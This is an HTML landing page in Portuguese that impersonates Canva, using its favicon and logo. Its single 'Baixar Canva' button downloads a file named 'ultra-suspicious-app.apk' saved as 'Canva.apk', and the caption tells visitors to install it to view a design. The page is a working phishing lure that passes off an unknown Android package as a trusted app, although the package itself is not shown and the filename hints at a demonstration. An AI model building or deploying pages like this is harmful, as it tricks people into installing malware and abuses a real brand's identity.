<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Canva</title>
    <link
      rel="icon"
      href="https://static.canva.com/static/images/favicon-1.ico"
    />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
    <link rel="stylesheet" href="./assets/style.css" />
  </head>

  <body>
    <section class="hero is-fullheight">
      <div
        class="hero-body is-flex is-flex-direction-column is-align-items-center is-justify-content-center"
      >
        <div class="is-flex is-justify-content-center mb-7">
          <figure class="image">
            <img
              class="mb-5 animate__animated animate__fadeInDown animate__delay-250ms"
              src="https://freepnglogo.com/images/all_img/1691829322canva-app-logo-png.png"
              alt="Canva"
              style="width: 200px"
            />
          </figure>
        </div>

        <div class="has-text-centered">
          <a
            class="button is-link is-medium px-6 py-4 mb-2 animate__animated animate__fadeInUp animate__delay-500ms"
            href="./assets/ultra-suspicious-app.apk"
            download="Canva.apk"
          >
            <span class="is-uppercase">Baixar Canva</span>
            <span class="icon">
              <i class="fas fa-download"></i>
            </span>
          </a>

          <p
            class="is-size-7 animate__animated animate__fadeInUp animate__delay-750ms"
          >
            Ao instalar o Canva, você poderá visualizar e baixar o design
          </p>
        </div>
      </div>
    </section>
  </body>
</html>
